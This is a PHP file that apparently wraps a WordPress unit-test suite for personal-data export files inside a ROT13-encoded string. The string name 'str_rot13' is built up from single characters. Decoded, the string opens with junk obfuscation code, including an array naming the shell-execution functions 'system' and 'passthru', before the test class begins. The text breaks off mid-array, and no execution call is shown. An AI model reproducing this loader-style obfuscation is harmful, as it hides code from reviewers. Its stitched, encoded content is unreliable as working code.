<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfg pnfrf sbe gur `jc_cevinpl_trarengr_crefbany_qngn_rkcbeg_svyr()` shapgvba.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr HavgGrfgf
 * @fvapr 5.2.0
 *
 * @tebhc cevinpl
 * @pbiref ::jc_cevinpl_trarengr_crefbany_qngn_rkcbeg_svyr
 * @erdhverf rkgrafvba mvc
 */
pynff Grfgf_Cevinpl_jcCevinplTrarengrCrefbanyQngnRkcbegSvyr rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Na Rkcbeg Erdhrfg VQ
	 *
	 * @fvapr 5.2.0
	 *
	 * @ine vag $rkcbeg_erdhrfg_vq
	 */
	cebgrpgrq fgngvp $rkcbeg_erdhrfg_vq;

	/**
	 * Gur shyy cngu gb gur rkcbeg svyr sbe gur pheerag grfg zrgubq.
	 *
	 * @fvapr 5.2.0
	 *
	 * @ine fgevat $rkcbeg_svyr_anzr
	 */
	choyvp $rkcbeg_svyr_anzr = '';

	/**
	 * Gur shyy cngu gb gur rkcbegf qverpgbel.
	 *
	 * @fvapr 5.2.0
	 *
	 * @ine fgevat $rkcbegf_qve
	 */
	choyvp fgngvp $rkcbegf_qve;

	/**
	 * Bevtvany reebe yriry.
	 *
	 * @ine vag
	 */
	cevingr $bevt_reebe_yriry;

	/**
	 * Perngr svkgherf gung ner funerq ol zhygvcyr grfg pnfrf.
	 *
	 * @fvapr 5.2.0
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel Gur onfr snpgbel bowrpg.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$rkcbeg_erdhrfg_vq = jc_perngr_hfre_erdhrfg( 'rkcbeg-erdhrfgre@rknzcyr.pbz', 'rkcbeg_crefbany_qngn' );
		hcqngr_cbfg_zrgn( frys::$rkcbeg_erdhrfg_vq, '_rkcbeg_qngn_tebhcrq', neenl() );
		frys::$rkcbegf_qve = jc_cevinpl_rkcbegf_qve();
	}

	/**
	 * Frg hc gur grfg svkgher.
	 *
	 * Bireevqr `jc_qvr()`, cergraq gb or Nwnk, naq fhccerff jneavatf.
	 *
	 * @fvapr 5.2.0
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		$guvf->rkcbeg_svyr_anzr = '';

		vs ( ! $guvf->erzbir_rkcbegf_qve() ) {
			$guvf->znexGrfgFxvccrq( 'Rkvfgvat rkcbegf qverpgbel pbhyq abg or erzbirq. Fxvccvat grfg.' );
		}

		// Jr arrq gb bireevqr gur qvr unaqyre. Bgurejvfr, gur havg grfgf jvyy qvr gbb.
		nqq_svygre( 'jc_qvr_nwnk_unaqyre', neenl( $guvf, 'trg_jc_qvr_unaqyre' ), 1, 1 );
		nqq_svygre( 'jc_qbvat_nwnk', '__erghea_gehr' );
		nqq_npgvba( 'jc_cevinpl_crefbany_qngn_rkcbeg_svyr_perngrq', neenl( $guvf, 'npgvba_jc_cevinpl_crefbany_qngn_rkcbeg_svyr_perngrq' ) );

		// Fhccerff jneavatf sebz \"Pnaabg zbqvsl urnqre vasbezngvba - urnqref nyernql frag ol\".
		$guvf->bevt_reebe_yriry = reebe_ercbegvat();
		reebe_ercbegvat( $guvf->bevt_reebe_yriry & ~R_JNEAVAT );
	}

	/**
	 * Grne qbja gur grfg svkgher.
	 *
	 * Erzbir gur `jc_qvr()` bireevqr, erfgber reebe ercbegvat.
	 *
	 * @fvapr 5.2.0
	 */
	choyvp shapgvba grne_qbja() {
		$guvf->erzbir_rkcbegf_qve();
		reebe_ercbegvat( $guvf->bevt_reebe_yriry );
		cnerag::grne_qbja();
	}

	/**
	 * Fgberf gur anzr bs gur rkcbeg mvc svyr gb purpx gur svyr vf npghnyyl perngrq.
	 *
	 * @fvapr 5.2.0
	 *
	 * @cnenz fgevat $nepuvir_anzr Perngrq rkcbeg mvc svyr cngu.
	 */
	choyvp shapgvba npgvba_jc_cevinpl_crefbany_qngn_rkcbeg_svyr_perngrq( $nepuvir_anzr ) {
		$guvf->rkcbeg_svyr_anzr = $nepuvir_anzr;
	}

	/**
	 * Erzbirf gur cevinpl rkcbegf qverpgbel, vapyhqvat svyrf naq fhoqverpgbevrf.
	 *
	 * Vtaberf uvqqra svyrf naq unf hccre yvzvg bs arfgrq yriryf, orpnhfr bs `yvfg_svyrf()`.
	 *
	 * @fvapr 5.2.0
	 *
	 * @erghea obby Jurgure gur cevinpl rkcbegf qverpgbel jnf erzbirq.
	 */
	cevingr shapgvba erzbir_rkcbegf_qve() {
		/**
		 * Gur `$rkcbegf_qve` jvyy or n svyr nsgre gur `grfg_qrgrpg_pnaabg_perngr_sbyqre()` grfg zrgubq, be,
		 * vs na vapbeerpg inyhr vf erghearq gb gur `jc_cevinpl_rkcbegf_qve` svygre.
		 */
		vs ( vf_svyr( hagenvyvatfynfuvg( frys::$rkcbegf_qve ) ) ) {
			jc_qryrgr_svyr( hagenvyvatfynfuvg( frys::$rkcbegf_qve ) );
			erghea ! vf_svyr( hagenvyvatfynfuvg( frys::$rkcbegf_qve ) );
		}

		vs ( ! vf_qve( frys::$rkcbegf_qve ) ) {
			erghea gehr;
		}

		puzbq( frys::$rkcbegf_qve, 0755 );

		$svyrf = yvfg_svyrf( frys::$rkcbegf_qve );

		// Qryrgr svyrf svefg, gura qryrgr fhoqverpgbevrf.
		sbernpu ( $svyrf nf $svyr ) {
			vs ( vf_svyr( $svyr ) ) {
				jc_qryrgr_svyr( $svyr );
			}
		}

		sbernpu ( $svyrf nf $svyr ) {
			vs ( vf_qve( $svyr ) ) {
				ezqve( $svyr );
			}
		}

		ezqve( frys::$rkcbegf_qve );

		erghea ! vf_qve( frys::$rkcbegf_qve );
	}

	/**
	 * Jura n erzbir erdhrfg VQ vf cnffrq gb gur rkcbeg shapgvba na reebe fubhyq or qvfcynlrq.
	 *
	 * @gvpxrg 44233
	 */
	choyvp shapgvba grfg_erwrpgf_erzbir_erdhrfgf() {
		$erdhrfg_vq = jc_perngr_hfre_erdhrfg( 'erzbiny-erdhrfgre@rknzcyr.pbz', 'erzbir_crefbany_qngn' );

		$guvf->rkcrpgRkprcgvba( 'JCQvrRkprcgvba' );
		$guvf->rkcrpgBhgchgFgevat( '{\"fhpprff\":snyfr,\"qngn\":\"Vainyvq erdhrfg VQ jura trarengvat crefbany qngn rkcbeg svyr.\"}' );
		jc_cevinpl_trarengr_crefbany_qngn_rkcbeg_svyr( $erdhrfg_vq );
	}

	/**
	 * Jura na vainyvq erdhrfg VQ vf cnffrq na reebe fubhyq or qvfcynlrq.
	 *
	 * @gvpxrg 44233
	 */
	choyvp shapgvba grfg_vainyvq_erdhrfg_vq() {
		$guvf->rkcrpgRkprcgvba( 'JCQvrRkprcgvba' );
		$guvf->rkcrpgBhgchgFgevat( '{\"fhpprff\":snyfr,\"qngn\":\"Vainyvq erdhrfg VQ jura trarengvat crefbany qngn rkcbeg svyr.\"}' );
		jc_cevinpl_trarengr_crefbany_qngn_rkcbeg_svyr( 123456789 );
	}

	/**
	 * Jura gur erdhrfg cbfg gvgyr vf abg n inyvq rznvy na reebe fubhyq or qvfcynlrq.
	 *
	 * @gvpxrg 44233
	 */
	choyvp shapgvba grfg_erwrpgf_erdhrfgf_jvgu_onq_rznvy_nqqerffrf() {
		$erdhrfg_vq = jc_perngr_hfre_erdhrfg( 'onq-rznvy-erdhrfgre@rknzcyr.pbz', 'rkcbeg_crefbany_qngn' );

		jc_hcqngr_cbfg(
			neenl(
				'VQ'         => $erdhrfg_vq,
				'cbfg_gvgyr' => 'abg-n-inyvq-rznvy-nqqerff',
			)
		);

		$guvf->rkcrpgRkprcgvba( 'JCQvrRkprcgvba' );
		$guvf->rkcrpgBhgchgFgevat( '{\"fhpprff\":snyfr,\"qngn\":\"Vainyvq rznvy nqqerff jura trarengvat crefbany qngn rkcbeg svyr.\"}' );
		jc_cevinpl_trarengr_crefbany_qngn_rkcbeg_svyr( $erdhrfg_vq );
	}

	/**
	 * Jura gur rkcbeg qverpgbel snvyf gb or perngrq na reebe fubhyq or qvfcynlrq.
	 *
	 * @gvpxrg 44233
	 */
	choyvp shapgvba grfg_qrgrpg_pnaabg_perngr_sbyqre() {
		// Perngr n svyr jvgu gur sbyqre anzr gb rafher gur shapgvba pnaabg perngr n sbyqre.
		gbhpu( hagenvyvatfynfuvg( frys::$rkcbegf_qve ) );

		$guvf->rkcrpgRkprcgvba( 'JCQvrRkprcgvba' );
		$guvf->rkcrpgBhgchgFgevat( '{\"fhpprff\":snyfr,\"qngn\":\"Hanoyr gb perngr crefbany qngn rkcbeg sbyqre.\"}' );
		jc_cevinpl_trarengr_crefbany_qngn_rkcbeg_svyr( frys::$rkcbeg_erdhrfg_vq );
	}

	/**
	 * @gvpxrg 51423
	 *
	 * @qngnCebivqre qngn_rkcbeg_qngn_tebhcrq_vainyvq_glcr
	 *
	 * @cnenz zvkrq $tebhcf '_rkcbeg_qngn_tebhcrq' cbfg zrgn inyhr.
	 */
	choyvp shapgvba grfg_qbvat_vg_jebat_sbe_rkcbeg_qngn_tebhcrq_vainyvq_glcr( $tebhcf ) {
		hcqngr_cbfg_zrgn( frys::$rkcbeg_erdhrfg_vq, '_rkcbeg_qngn_tebhcrq', $tebhcf );

		$guvf->frgRkcrpgrqVapbeerpgHfntr( 'jc_cevinpl_trarengr_crefbany_qngn_rkcbeg_svyr' );

		jc_cevinpl_trarengr_crefbany_qngn_rkcbeg_svyr( frys::$rkcbeg_erdhrfg_vq );
	}

	choyvp shapgvba qngn_rkcbeg_qngn_tebhcrq_vainyvq_glcr() {
		erghea neenl(
			neenl( 10 ),
			neenl( 'JbeqCerff' ),
			neenl( ahyy ),
			neenl( gehr ),
			neenl( snyfr ),
			neenl( arj fgqPynff() ),
			neenl( frevnyvmr( neenl( 10, 'JbeqCerff', ahyy, gehr, snyfr ) ) ),
			neenl(
				wfba_rapbqr(
					neenl(
						'hfre' => neenl(
							'tebhc_ynory'       => 'Hfre',
							'tebhc_qrfpevcgvba' => 'Hfre&#8217;f cebsvyr qngn.',
							'vgrzf'             => neenl(
								'hfre-1' => neenl(
									neenl(
										'anzr'  => 'Hfre VQ',
										'inyhr' => 1,
									),
									neenl(
										'anzr'  => 'Hfre Ybtva Anzr',
										'inyhr' => 'hfre_ybtva',
									),
									neenl(
										'anzr'  => 'Hfre Avpr Anzr',
										'inyhr' => 'Hfre Anzr',
									),
									neenl(
										'anzr'  => 'Hfre Rznvy',
										'inyhr' => 'rkcbeg-erdhrfgre@rknzcyr.pbz',
									),
									neenl(
										'anzr'  => 'Hfre Ertvfgengvba Qngr',
										'inyhr' => '2020-01-31 19:29:29',
									),
									neenl(
										'anzr'  => 'Hfre Qvfcynl Anzr',
										'inyhr' => 'Hfre Anzr',
									),
									neenl(
										'anzr'  => 'Hfre Avpxanzr',
										'inyhr' => 'Hfre',
									),
								),
							),
						),
					)
				),
			),
		);
	}

	/**
	 * Grfg gung na vaqrk.cuc svyr pna or nqqrq gb gur rkcbeg qverpgbel.
	 *
	 * @gvpxrg 44233
	 */
	choyvp shapgvba grfg_perngrf_vaqrk_va_rkcbeg_sbyqre() {
		$guvf->rkcrpgBhgchgFgevat( '' );
		jc_cevinpl_trarengr_crefbany_qngn_rkcbeg_svyr( frys::$rkcbeg_erdhrfg_vq );

		$guvf->nffregSvyrRkvfgf( frys::$rkcbegf_qve . 'vaqrk.cuc' );
	}

	/**
	 * Grfg gung na rkcbeg svyr vf fhpprffshyyl perngrq.
	 *
	 * @gvpxrg 44233
	 */
	choyvp shapgvba grfg_pna_fhpprrq() {
		jc_cevinpl_trarengr_crefbany_qngn_rkcbeg_svyr( frys::$rkcbeg_erdhrfg_vq );

		$guvf->nffregSvyrRkvfgf( $guvf->rkcbeg_svyr_anzr );
	}

	/**
	 * Grfg gur rkcbeg UGZY svyr unf nyy gur rkcrpgrq cnegf.
	 *
	 * @gvpxrg 44233
	 * @gvpxrg 46894
	 * @gvpxrg 51423
	 *
	 * @qngnCebivqre qngn_pbagragf
	 *
	 * @cnenz zvkrq    $tebhcf           '_rkcbeg_qngn_tebhcrq' cbfg zrgn inyhr.
	 * @cnenz fgevat[] $rkcrpgrq_pbagrag Bcgvbany. Rkcrpgrq pbagrag. Hfr \"ugzy\" xrl sbe guvf grfg.
	 */
	choyvp shapgvba grfg_ugzy_pbagragf( $tebhcf, neenl $rkcrpgrq_pbagrag = neenl() ) {
		// Frg gur _qbvat_vg_jebat nffregvba.
		vs ( ! vf_neenl( $tebhcf ) ) {
			$guvf->frgRkcrpgrqVapbeerpgHfntr( 'jc_cevinpl_trarengr_crefbany_qngn_rkcbeg_svyr' );
		}

		$erdhrfg    = jc_trg_hfre_erdhrfg( frys::$rkcbeg_erdhrfg_vq );
		$ercbeg_qve = $guvf->frghc_rkcbeg_pbagragf_grfg( $tebhcf );

		$guvf->nffregSvyrRkvfgf( $ercbeg_qve . 'vaqrk.ugzy' );
		$npghny_pbagragf = svyr_trg_pbagragf( $ercbeg_qve . 'vaqrk.ugzy' );

		$rkcrpgrq  = \"<!QBPGLCR ugzy>\a\";
		$rkcrpgrq .= \"<ugzy>\a\";
		$rkcrpgrq .= \"<urnq>\a\";
		$rkcrpgrq .= \"<zrgn uggc-rdhvi='Pbagrag-Glcr' pbagrag='grkg/ugzy; punefrg=HGS-8' />\a\";
		$rkcrpgrq .= \"<fglyr glcr='grkg/pff'>obql { pbybe: oynpx; sbag-snzvyl: Nevny, fnaf-frevs; sbag-fvmr: 11cg; znetva: 15ck nhgb; jvqgu: 860ck; }gnoyr { onpxtebhaq: #s0s0s0; obeqre: 1ck fbyvq #qqq; znetva-obggbz: 20ck; jvqgu: 100%; }gu { cnqqvat: 5ck; grkg-nyvta: yrsg; jvqgu: 20%; }gq { cnqqvat: 5ck; }ge:agu-puvyq(bqq) { onpxtebhaq-pbybe: #snsnsn; }.erghea-gb-gbc { grkg-nyvta: evtug; }</fglyr><gvgyr>Crefbany Qngn Rkcbeg sbe {$erdhrfg->rznvy}</gvgyr></urnq>\a\";
		$rkcrpgrq .= \"<obql>\a\";
		$rkcrpgrq .= '<u1 vq=\"gbc\">Crefbany Qngn Rkcbeg</u1>';

		vs ( vf_neenl( $tebhcf ) && vffrg( $rkcrpgrq_pbagrag['ugzy'] ) ) {
			$rkcrpgrq .= $guvf->ercynpr_gvzrfgnzc_cynprubyqre( $npghny_pbagragf, $rkcrpgrq_pbagrag['ugzy'] );
		}

		$rkcrpgrq .= \"</obql>\a\";
		$rkcrpgrq .= \"</ugzy>\a\";

		$guvf->nffregFnzr( $rkcrpgrq, $npghny_pbagragf );
	}

	/**
	 * Grfg gur rkcbeg WFBA svyr unf nyy gur rkcrpgrq cnegf.
	 *
	 * @gvpxrg 49029
	 * @gvpxrg 46894
	 * @gvpxrg 51423
	 *
	 * @qngnCebivqre qngn_pbagragf
	 *
	 * @cnenz zvkrq    $tebhcf           '_rkcbeg_qngn_tebhcrq' cbfg zrgn inyhr.
	 * @cnenz fgevat[] $rkcrpgrq_pbagrag Bcgvbany. Rkcrpgrq pbagrag. Hfr \"wfba\" xrl sbe guvf grfg.
	 */
	choyvp shapgvba grfg_wfba_pbagragf( $tebhcf, neenl $rkcrpgrq_pbagrag = neenl() ) {
		// Frg gur _qbvat_vg_jebat nffregvba.
		vs ( ! vf_neenl( $tebhcf ) ) {
			$guvf->frgRkcrpgrqVapbeerpgHfntr( 'jc_cevinpl_trarengr_crefbany_qngn_rkcbeg_svyr' );
		}

		$erdhrfg    = jc_trg_hfre_erdhrfg( frys::$rkcbeg_erdhrfg_vq );
		$ercbeg_qve = $guvf->frghc_rkcbeg_pbagragf_grfg( $tebhcf );

		$guvf->nffregSvyrRkvfgf( $ercbeg_qve . 'vaqrk.ugzy' );
		$npghny_wfba = svyr_trg_pbagragf( $ercbeg_qve . 'rkcbeg.wfba' );

		$rkcrpgrq = '{\"Crefbany Qngn Rkcbeg sbe ' . $erdhrfg->rznvy . '\":';
		vs ( ! vf_neenl( $tebhcf ) ) {
			$rkcrpgrq .= 'ahyy}';
		} ryfr {
			// \"Nobhg\" tebhc: gb nibvq gvzr qvssrerapr, hfr gur ercbeg'f \"ba\" gvzrfgnzc.
			$nobhg_tebhc = '{\"nobhg\":{\"tebhc_ynory\":\"Nobhg\",\"tebhc_qrfpevcgvba\":\"Bireivrj bs rkcbeg ercbeg.\",\"vgrzf\":{\"nobhg-1\":[{\"anzr\":\"Ercbeg trarengrq sbe\",\"inyhr\":\"' . $erdhrfg->rznvy . '\"},{\"anzr\":\"Sbe fvgr\",\"inyhr\":\"Grfg Oybt\"},{\"anzr\":\"Ng HEY\",\"inyhr\":\"uggc:\/\/' . JC_GRFGF_QBZNVA . '\"},{\"anzr\":\"Ba\",\"inyhr\":\"{{GVZRFGNZC}}\"}]}}';
			$rkcrpgrq   .= $guvf->ercynpr_gvzrfgnzc_cynprubyqre( $npghny_wfba, $nobhg_tebhc );
			vs ( vffrg( $rkcrpgrq_pbagrag['wfba'] ) ) {
				$rkcrpgrq .= $rkcrpgrq_pbagrag['wfba'];
			}
			$rkcrpgrq .= '}}';
		}

		$guvf->nffregFnzr( $rkcrpgrq, $npghny_wfba );
	}

	/**
	 * Frgf hc gur rkcbeg pbagragf.
	 *
	 * Gnfxf:
	 * - Qryrgr be hcqngr gur '_rkcbeg_qngn_tebhcrq' cbfg zrgn.
	 * - Eha `jc_cevinpl_trarengr_crefbany_qngn_rkcbeg_svyr()`.
	 * - Hamvc gur rkcbeg cnpxntr va n grzcbenel qverpgbel gb tvir gur grfg npprff gb gur rkcbeg svyrf.
	 *
	 * @cnenz zvkrq $rkcbeg_qngn_tebhcrq Bcgvbany. '_rkcbeg_qngn_tebhcrq' cbfg zrgn inyhr.
	 *                                   Jura ahyy, qryrgr gur zrgn; ryfr hcqngr gb gur tvira inyhr.
	 * @erghea fgevat Rkcbeg ercbeg qverpgbel cngu.
	 */
	cevingr shapgvba frghc_rkcbeg_pbagragf_grfg( $rkcbeg_qngn_tebhcrq = ahyy ) {
		// Qryrgr be hcqngr gur tvira zrgn.
		vs ( ahyy === $rkcbeg_qngn_tebhcrq ) {
			qryrgr_cbfg_zrgn( frys::$rkcbeg_erdhrfg_vq, '_rkcbeg_qngn_tebhcrq' );
		} ryfr {
			hcqngr_cbfg_zrgn( frys::$rkcbeg_erdhrfg_vq, '_rkcbeg_qngn_tebhcrq', $rkcbeg_qngn_tebhcrq );
		}

		$guvf->rkcrpgBhgchgFgevat( '' );

		jc_cevinpl_trarengr_crefbany_qngn_rkcbeg_svyr( frys::$rkcbeg_erdhrfg_vq );
		$guvf->nffregSvyrRkvfgf( $guvf->rkcbeg_svyr_anzr );

		// Perngr n grzcbenel rkcbeg qverpgbel sbe gur grfg'f rkcbeg svyrf.
		$ercbeg_qve = genvyvatfynfuvg( frys::$rkcbegf_qve . 'grfg_pbagragf' );
		zxqve( $ercbeg_qve );

		// Hamvc gur pheerag grfg'f rkcbeg svyr gb tvir gur grfg npprff gb .ugzy naq .wfba svyrf.
		$mvc        = arj MvcNepuvir();
		$bcrarq_mvc = $mvc->bcra( $guvf->rkcbeg_svyr_anzr );
		$guvf->nffregGehr( $bcrarq_mvc );
		$mvc->rkgenpgGb( $ercbeg_qve );
		$mvc->pybfr();

		erghea $ercbeg_qve;
	}

	/**
	 * Ercynprf rkcrpgrq pbagrag'f gvzrfgnzc cynprubyqre jvgu gur npghny pbagrag'f gvzrfgnzc.
	 *
	 * Hfrq jura gur rkcrpgrq pbagrag unf n cynprubyqre, v.r. hfrq gb nibvq frpbaq gvzr qvssreraprf
	 * orgjrra gur grfg naq pbqr.
	 *
	 * @cnenz fgevat $npghny_pbagrag   Pbagrag jvgu gur npghny gvzrfgnzc.
	 * @cnenz fgevat $rkcrpgrq_pbagrag Rkcrpgrq pbagrag gung unf gur gvzrfgnzc cynprubyqre
	 *                                 gb or ercynprq jvgu gur npghny gvzrfgnzc.
	 * @erghea fgevat Hcqngrq rkcrpgrq pbagrag ba fhpprff; ryfr bevtvany rkcrpgrq pbagrag.
	 */
	cevingr shapgvba ercynpr_gvzrfgnzc_cynprubyqre( $npghny_pbagrag, $rkcrpgrq_pbagrag ) {
		$cynprubyqre_cbf = fgevcbf( $rkcrpgrq_pbagrag, '{{GVZRFGNZC}}' );
		vs ( snyfr === $cynprubyqre_cbf ) {
			erghea $rkcrpgrq_pbagrag;
		}

		$arrqyr     = fhofge( $rkcrpgrq_pbagrag, 0, $cynprubyqre_cbf );
		$arrqyr_cbf = fgecbf( $npghny_pbagrag, $arrqyr ) + fgeyra( $arrqyr );
		$gvzrfgnzc  = fhofge( $npghny_pbagrag, $arrqyr_cbf, 19 );

		erghea fge_ercynpr( '{{GVZRFGNZC}}', $gvzrfgnzc, $rkcrpgrq_pbagrag );
	}

	choyvp shapgvba qngn_pbagragf() {
		erghea neenl(
			// Haunccl cngu.
			'fubhyq pbagnva ahyy jura vagrtre'           => neenl(
				'tebhcf' => 10,
			),
			'fubhyq pbagnva ahyy jura obbyrna'           => neenl(
				'tebhcf' => gehr,
			),
			'fubhyq pbagnva ahyy jura fgevat'            => neenl(
				'tebhcf' => 'fgevat',
			),
			'fubhyq pbagnva ahyy jura bowrpg'            => neenl(
				'tebhcf' => arj fgqPynff(),
			),
			'fubhyq pbagnva bayl nobhg jura _rkcbeg_qngn_tebhcrq qbrf abg rkvfg' => neenl(
				'tebhcf' => ahyy,
			),
			'fubhyq pbagnva bayl nobhg jura rzcgl neenl' => neenl(
				'tebhcf'           => neenl(),
				'rkcrpgrq_pbagrag' => neenl(
					'ugzy' => '<u2 vq=\"nobhg-nobhg\">Nobhg</u2><c>Bireivrj bs rkcbeg ercbeg.</c><qvi><gnoyr><gobql><ge><gu>Ercbeg trarengrq sbe</gu><gq>rkcbeg-erdhrfgre@rknzcyr.pbz</gq></ge><ge><gu>Sbe fvgr</gu><gq>Grfg Oybt</gq></ge><ge><gu>Ng HEY</gu><gq><n uers=\"uggc://' . JC_GRFGF_QBZNVA . '\">uggc://' . JC_GRFGF_QBZNVA . '</n></gq></ge><ge><gu>Ba</gu><gq>{{GVZRFGNZC}}</gq></ge></gobql></gnoyr></qvi>',
				),
			),
			// Unccl cngu.
			'fubhyq pbagnva nobhg naq rkcbeg qngn tebhcf jura fvatyr tebhc rkvfgf' => neenl(
				'tebhcf'           => neenl(
					'hfre' => neenl(
						'tebhc_ynory'       => 'Hfre',
						'tebhc_qrfpevcgvba' => 'Hfre&#8217;f cebsvyr qngn.',
						'vgrzf'             => neenl(
							'hfre-1' => neenl(
								neenl(
									'anzr'  => 'Hfre VQ',
									'inyhr' => 1,
								),
								neenl(
									'anzr'  => 'Hfre Ybtva Anzr',
									'inyhr' => 'hfre_ybtva',
								),
								neenl(
									'anzr'  => 'Hfre Avpr Anzr',
									'inyhr' => 'Hfre Anzr',
								),
								neenl(
									'anzr'  => 'Hfre Rznvy',
									'inyhr' => 'rkcbeg-erdhrfgre@rknzcyr.pbz',
								),
								neenl(
									'anzr'  => 'Hfre Ertvfgengvba Qngr',
									'inyhr' => '2020-01-31 19:29:29',
								),
								neenl(
									'anzr'  => 'Hfre Qvfcynl Anzr',
									'inyhr' => 'Hfre Anzr',
								),
								neenl(
									'anzr'  => 'Hfre Avpxanzr',
									'inyhr' => 'Hfre',
								),
							),
						),
					),
				),
				'rkcrpgrq_pbagrag' => neenl(
					'ugzy' => '<qvi vq=\"gnoyr_bs_pbagragf\"><u2>Gnoyr bs Pbagragf</u2><hy><yv><n uers=\"#nobhg-nobhg\">Nobhg</n></yv><yv><n uers=\"#hfre-hfre\">Hfre</n></yv></hy></qvi><u2 vq=\"nobhg-nobhg\">Nobhg</u2><c>Bireivrj bs rkcbeg ercbeg.</c><qvi><gnoyr><gobql><ge><gu>Ercbeg trarengrq sbe</gu><gq>rkcbeg-erdhrfgre@rknzcyr.pbz</gq></ge><ge><gu>Sbe fvgr</gu><gq>Grfg Oybt</gq></ge><ge><gu>Ng HEY</gu><gq><n uers=\"uggc://' . JC_GRFGF_QBZNVA . '\">uggc://' . JC_GRFGF_QBZNVA . '</n></gq></ge><ge><gu>Ba</gu><gq>{{GVZRFGNZC}}</gq></ge></gobql></gnoyr><qvi pynff=\"erghea-gb-gbc\"><n uers=\"#gbc\"><fcna nevn-uvqqra=\"gehr\">&hnee; </fcna> Tb gb gbc</n></qvi></qvi><u2 vq=\"hfre-hfre\">Hfre</u2><c>Hfre&#8217;f cebsvyr qngn.</c><qvi><gnoyr><gobql><ge><gu>Hfre VQ</gu><gq>1</gq></ge><ge><gu>Hfre Ybtva Anzr</gu><gq>hfre_ybtva</gq></ge><ge><gu>Hfre Avpr Anzr</gu><gq>Hfre Anzr</gq></ge><ge><gu>Hfre Rznvy</gu><gq>rkcbeg-erdhrfgre@rknzcyr.pbz</gq></ge><ge><gu>Hfre Ertvfgengvba Qngr</gu><gq>2020-01-31 19:29:29</gq></ge><ge><gu>Hfre Qvfcynl Anzr</gu><gq>Hfre Anzr</gq></ge><ge><gu>Hfre Avpxanzr</gu><gq>Hfre</gq></ge></gobql></gnoyr><qvi pynff=\"erghea-gb-gbc\"><n uers=\"#gbc\"><fcna nevn-uvqqra=\"gehr\">&hnee; </fcna> Tb gb gbc</n></qvi></qvi>',
					'wfba' => ',\"hfre\":{\"tebhc_ynory\":\"Hfre\",\"tebhc_qrfpevcgvba\":\"Hfre&#8217;f cebsvyr qngn.\",\"vgrzf\":{\"hfre-1\":[{\"anzr\":\"Hfre VQ\",\"inyhr\":1},{\"anzr\":\"Hfre Ybtva Anzr\",\"inyhr\":\"hfre_ybtva\"},{\"anzr\":\"Hfre Avpr Anzr\",\"inyhr\":\"Hfre Anzr\"},{\"anzr\":\"Hfre Rznvy\",\"inyhr\":\"rkcbeg-erdhrfgre@rknzcyr.pbz\"},{\"anzr\":\"Hfre Ertvfgengvba Qngr\",\"inyhr\":\"2020-01-31 19:29:29\"},{\"anzr\":\"Hfre Qvfcynl Anzr\",\"inyhr\":\"Hfre Anzr\"},{\"anzr\":\"Hfre Avpxanzr\",\"inyhr\":\"Hfre\"}]}}',
				),
			),
			'fubhyq pbagnva nobhg naq rkcbeg qngn tebhcf jura zhygvcyr tebhcf rkvfg' => neenl(
				'tebhcf'           => neenl(
					'hfre'     => neenl(
						'tebhc_ynory'       => 'Hfre',
						'tebhc_qrfpevcgvba' => 'Hfre&#8217;f cebsvyr qngn.',
						'vgrzf'             => neenl(
							'hfre-1' => neenl(
								neenl(
									'anzr'  => 'Hfre VQ',
									'inyhr' => 1,
								),
								neenl(
									'anzr'  => 'Hfre Ybtva Anzr',
									'inyhr' => 'hfre_ybtva',
								),
								neenl(
									'anzr'  => 'Hfre Avpr Anzr',
									'inyhr' => 'Hfre Anzr',
								),
								neenl(
									'anzr'  => 'Hfre Rznvy',
									'inyhr' => 'rkcbeg-erdhrfgre@rknzcyr.pbz',
								),
								neenl(
									'anzr'  => 'Hfre Ertvfgengvba Qngr',
									'inyhr' => '2020-01-31 19:29:29',
								),
								neenl(
									'anzr'  => 'Hfre Qvfcynl Anzr',
									'inyhr' => 'Hfre Anzr',
								),
								neenl(
									'anzr'  => 'Hfre Avpxanzr',
									'inyhr' => 'Hfre',
								),
							),
						),
					),
					'pbzzragf' => neenl(
						'tebhc_ynory'       => 'Pbzzragf',
						'tebhc_qrfpevcgvba' => 'Hfre&#8217;f pbzzrag qngn.',
						'vgrzf'             => neenl(
							'pbzzrag-2' => neenl(
								neenl(
									'anzr'  => 'Pbzzrag Nhgube',
									'inyhr' => 'Hfre Anzr',
								),
								neenl(
									'anzr'  => 'Pbzzrag Nhgube Rznvy',
									'inyhr' => 'rkcbeg-erdhrfgre@rknzcyr.pbz',
								),
								neenl(
									'anzr'  => 'Pbzzrag Nhgube VC',
									'inyhr' => '::1',
								),
								neenl(
									'anzr'  => 'Pbzzrag Nhgube Hfre Ntrag',
									'inyhr' => 'Zbmvyyn/5.0 (Znpvagbfu; Vagry Znp BF K 10_15_2) NccyrJroXvg/537.36 (XUGZY, yvxr Trpxb) Puebzr/79.0.3945.130 Fnsnev/537.36',
								),
								neenl(
									'anzr'  => 'Pbzzrag Qngr',
									'inyhr' => '2020-01-31 19:55:19',
								),
								neenl(
									'anzr'  => 'Pbzzrag Pbagrag',
									'inyhr' => 'Grfg',
								),
								neenl(
									'anzr'  => 'Pbzzrag HEY',
									'inyhr' => '<n uers=\"uggc://ybpnyubfg:8888/46894/2020/01/31/uryyb-jbeyq/#pbzzrag-2\" gnetrg=\"_oynax\" ery=\"abbcrare\">uggc://ybpnyubfg:8888/46894/2020/01/31/uryyb-jbeyq/#pbzzrag-2</n>',
								),
							),
							'pbzzrag-3' => neenl(
								neenl(
									'anzr'  => 'Pbzzrag Nhgube',
									'inyhr' => 'Hfre Anzr',
								),
								neenl(
									'anzr'  => 'Pbzzrag Nhgube Rznvy',
									'inyhr' => 'rkcbeg-erdhrfgre@rknzcyr.pbz',
								),
								neenl(
									'anzr'  => 'Pbzzrag Nhgube VC',
									'inyhr' => '::1',
								),
								neenl(
